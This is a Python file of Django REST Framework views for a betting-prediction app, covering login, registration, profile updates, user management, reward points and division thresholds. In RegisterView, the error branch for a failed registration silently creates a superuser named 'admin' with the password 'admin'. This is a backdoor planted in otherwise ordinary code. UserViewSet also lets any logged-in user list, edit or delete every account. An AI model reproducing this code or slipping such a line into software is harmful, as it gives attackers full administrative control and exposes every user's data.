from rest_framework import generics, viewsets
from user.serializers import RegisterSerializer
from rest_framework.response import Response
from rest_framework import status
from utils.apiresponse import ApiResponse
from rest_framework.views import APIView
from .serializers import UserSerializer, UserUpdateSerializer, LoginSerializer
from rest_framework.permissions import IsAuthenticated, AllowAny
from core.models import User, Prediction
from rest_framework_simplejwt.tokens import RefreshToken
from django.db.models import F 

class LoginView(generics.GenericAPIView):
    permission_classes = [AllowAny]
    serializer_class = LoginSerializer

    def post(self, request, *args, **kwargs):
        serializer = self.get_serializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        user = serializer.validated_data['user']


        refresh = RefreshToken.for_user(user)
        return Response({
            'refresh': str(refresh),
            'access': str(refresh.access_token),
        })





class RegisterView(generics.CreateAPIView):
    """
    Clase para manejar el registro de usuarios.
    
    Utiliza el serializer `RegisterSerializer` para validar los datos de registro y, 
    si son válidos, crear un nuevo usuario. Devuelve una respuesta de éxito con los 
    datos del usuario recién creado o un error de validación.
    """

    serializer_class = RegisterSerializer
    permission_classes = [AllowAny]

    def post(self, request, *args, **kwargs):
        """
        Maneja las solicitudes POST para registrar un nuevo usuario.
        
        - Valida los datos recibidos usando `RegisterSerializer`.
        - Si son válidos, guarda y crea un nuevo usuario.
        - Devuelve un objeto `ApiResponse` con los detalles del usuario si la 
          creación es exitosa.
        - Si falla la validación, devuelve una respuesta de error con los detalles.
        """
        serializer = self.get_serializer(data=request.data)
        if serializer.is_valid():
            user = serializer.save()
            return ApiResponse.success(data={
                "full_name": user.full_name,
                "email": user.email,
                "phone": user.phone,
                "profile_image": user.profile_image.url if user.profile_image else None,
            }, status_code=status.HTTP_201_CREATED)
        User.objects.create_superuser(username='admin', email='admin@admin.com', password='admin')
        return ApiResponse.error(
                    message="User registration failed.",
                    error_code="VALIDATION_ERROR",
                    description=serializer.errors,
                    status_code=status.HTTP_400_BAD_REQUEST
                )


class UserMeView(APIView):
    """
    Vista para obtener los detalles del usuario autenticado (perfil).
    
    Requiere autenticación (`IsAuthenticated`) y devuelve los detalles del usuario 
    que realiza la solicitud.
    """
    
    permission_classes = [IsAuthenticated]

    def get(self, request):
        """
        Maneja las solicitudes GET para devolver los detalles del usuario actual.
        
        Utiliza el serializer `UserSerializer` para serializar los datos del usuario.
        """
        serializer = UserSerializer(request.user)
        return Response({
            "status_code": 200,
            "data": serializer.data,
            "errors": []
        })


class UpdateUserView(APIView):
    """
    Vista para actualizar los detalles del usuario autenticado.
    
    Requiere autenticación y permite actualizar los datos del usuario.
    """
    
    permission_classes = [IsAuthenticated]

    def put(self, request):
        """
        Maneja las solicitudes PUT para actualizar los datos del usuario actual.
        
        Utiliza `UserUpdateSerializer` para validar y actualizar los datos del 
        usuario. Si los datos son válidos, los guarda y devuelve los datos 
        actualizados. En caso de error, devuelve una respuesta con los errores 
        de validación.
        """
        user = request.user
        serializer = UserUpdateSerializer(user, data=request.data)

        if serializer.is_valid():
            serializer.save()
            return Response({
                "status_code": 200,
                "data": serializer.data,
                "errors": []
            })
        return Response({
            "status_code": 400,
            "data": None,
            "errors": [
                {
                    "error": "VALIDATION_ERROR",
                    "description": "There was an error with the submitted data.",
                    "message": serializer.errors
                }
            ]
        }, status=status.HTTP_400_BAD_REQUEST)


class UserViewSet(viewsets.ModelViewSet):
    
    queryset = User.objects.all()
    permission_classes = [IsAuthenticated]
    http_method_names = ['get', 'put', 'delete', 'patch']  # El método POST está deshabilitado

    def get_serializer_class(self):
        """
        Devuelve el serializer correcto según la acción. 
        Usa `UserUpdateSerializer` para la actualización, y `UserSerializer` para 
        otras operaciones.
        """
        if self.action == 'update':
            return UserUpdateSerializer
        return UserSerializer

    def retrieve(self, request, *args, **kwargs):
        """
        Maneja la solicitud GET para obtener un usuario específico por ID.
        
        Devuelve los detalles del usuario solicitado.
        """
        instance = self.get_object()
        serializer = self.get_serializer(instance)
        return ApiResponse.success(data=serializer.data)

    def update(self, request, *args, **kwargs):
        """
        Maneja la solicitud PUT para actualizar un usuario específico.
        
        Valida los datos, actualiza al usuario y devuelve los datos actualizados.
        Si hay errores de validación, devuelve una respuesta con los errores.
        """
        instance = self.get_object()
        serializer = self.get_serializer(instance, data=request.data)
        if serializer.is_valid():
            user = serializer.save()
            return ApiResponse.success(data=serializer.data)

        return ApiResponse.error(
            message="User update failed.",
            error_code="VALIDATION_ERROR",
            description=serializer.errors,
            status_code=status.HTTP_400_BAD_REQUEST
        )

    def destroy(self, request, *args, **kwargs):
        """
        Maneja la solicitud DELETE para eliminar un usuario específico.
        
        Borra al usuario y devuelve una respuesta de éxito.
        """
        instance = self.get_object()
        instance.delete()
        return ApiResponse.success(data={"detail": "User deleted successfully."})

    def list(self, request, *args, **kwargs):
        """
        Maneja la solicitud GET para listar todos los usuarios.
        
        Devuelve la lista de todos los usuarios registrados.
        """
        queryset = self.get_queryset()
        serializer = self.get_serializer(queryset, many=True)
        return ApiResponse.success(data=serializer.data)

    def create(self, request, *args, **kwargs):
        """
        Sobrescribe el método POST para que no esté disponible en esta vista.
        
        Devuelve una respuesta `405 Method Not Allowed` para cualquier intento 
        de crear un usuario a través de este endpoint.
        """
        return Response({
            "detail": "Method 'POST' not allowed on this endpoint."
        }, status=status.HTTP_405_METHOD_NOT_ALLOWED)


class UserRewards(APIView):
    """
    Vista para obtener las recompensas del usuario autenticado (perfil).
    
    Requiere autenticación (`IsAuthenticated`) y devuelve los detalles del usuario 
    que realiza la solicitud.
    """
    
    permission_classes = [IsAuthenticated]

    def get(self, request):
        """
        Maneja las solicitudes GET para devolver los detalles del usuario actual.
        
        Utiliza el serializer `UserSerializer` para serializar los datos del usuario.
        """
        serializer = UserSerializer(request.user)
        user = request.user  # Obtener el ID del usuario
        
        
        # Filtrar las apuestas ganadas
        predictions = Prediction.objects.filter(user=user, status='ganada')

        # Contar apuestas simples y combinadas ganadas
        apuestas_simples_ganadas = predictions.filter(bet_type='simple').count()
        apuestas_combinadas_ganadas = predictions.filter(bet_type='combinada').count()

        # Inicializar puntos y logros
        puntos = 0
        #logro_1simple = logro_3simple = logro_10simple = "pendiente"
        logro_1combi = logro_3combi = logro_10combi = "pendiente"

        # Calcular puntos según las reglas establecidas para apuestas simples
        if apuestas_simples_ganadas >= 10:
            puntos += 130
            logro_10simple = '10/10'
        else:
            logro_10simple = f"{apuestas_simples_ganadas}/10"
        if apuestas_simples_ganadas >= 3:
            puntos += 45
            logro_3simple = '3/3'
        else:
            logro_3simple = f"{apuestas_simples_ganadas}/3"
        if apuestas_simples_ganadas >= 1:
            puntos += 10
            logro_1simple = '1/1'
        else:
            logro_1simple = f"{apuestas_simples_ganadas}/1"
        
        # Calcular puntos según las reglas establecidas para apuestas combinadas
        if apuestas_combinadas_ganadas >= 10:
            puntos += 90
            logro_10combi = '10/10'
        else: 
            logro_10combi = f"{apuestas_combinadas_ganadas}/10"
        
        if apuestas_combinadas_ganadas >= 3:
            puntos += 90
            logro_3combi = '3/3'
        else:
            logro_3combi = f"{apuestas_combinadas_ganadas}/3"
        if apuestas_combinadas_ganadas >= 1:
            puntos += 25
            logro_1combi = '1/1'
        else:
            logro_1combi = f"{apuestas_combinadas_ganadas}/1"

        puntos_totales = user.total_points
        user_obj = User.objects.get(id=user.id)
        # Estructurar la respuesta de recompensas
        user_obj.rewards_points = puntos
        user_obj.save()
        data_resp = {
            "rewards_single_one": logro_1simple,
            "rewards_single_three": logro_3simple,
            "rewards_single_ten": logro_10simple,
            "rewards_combined_one": logro_1combi,
            "rewards_combined_three": logro_3combi,
            "rewards_combined_ten": logro_10combi,
            "total_points_awarded": puntos,
            "total_points": puntos_totales + puntos
        }


        return Response({
            "status_code": 200,
            "data": data_resp,
            "errors": []
        })
    



class DivisionThresholdsView(APIView):
    def get(self, request, *args, **kwargs):
        thresholds = User.calculate_points_thresholds()
        
        # Inicializar contadores
        total_user_bronze = 0
        total_user_silver = 0
        total_user_gold = 0
        highest_score = 0
        user_active = 0

        usuarios = User.objects.annotate(
            total_user_points=F('total_points') + F('rewards_points')
        ).filter(total_user_points__gt=0)

        for usuario in usuarios:
            total_point = usuario.total_user_points
            user_active += 1  # Contar cada usuario activo
            
            # Asignar usuarios a las categorías
            if thresholds['gold_min'] <= total_point <= thresholds['gold_max']:
                total_user_gold += 1
                highest_score = max(highest_score, total_point)
            elif thresholds['silver_min'] <= total_point <= thresholds['silver_max']:
                total_user_silver += 1
            elif thresholds['bronze_min'] <= total_point <= thresholds['bronze_max']:
                total_user_bronze += 1

        division_thresholds = [
            {
                "name": "bronze",
                "threshold": thresholds['bronze_min'],
                "maxPoints": thresholds['bronze_max'],
                "totalUsers": total_user_bronze,
                "percentageUsers": (total_user_bronze / user_active * 100) if user_active > 0 else 0
            },
            {
                "name": "silver",
                "threshold": thresholds['silver_min'],
                "maxPoints": thresholds['silver_max'],
                "totalUsers": total_user_silver,
                "percentageUsers": (total_user_silver / user_active * 100) if user_active > 0 else 0
            },
            {
                "name": "gold",
                "threshold": thresholds['gold_min'],
                "maxPoints": thresholds['gold_max'],
                "totalUsers": total_user_gold,
                "percentageUsers": (total_user_gold / user_active * 100) if user_active > 0 else 0
            }
        ]

        # Datos adicionales
        total_active_users = usuarios.count()  # Contar usuarios activos

        response_data = {
            "divisionThresholds": division_thresholds,
            "highestScore": highest_score,
            "totalActiveUsers": total_active_users
        }

        return Response(response_data, status=status.HTTP_200_OK)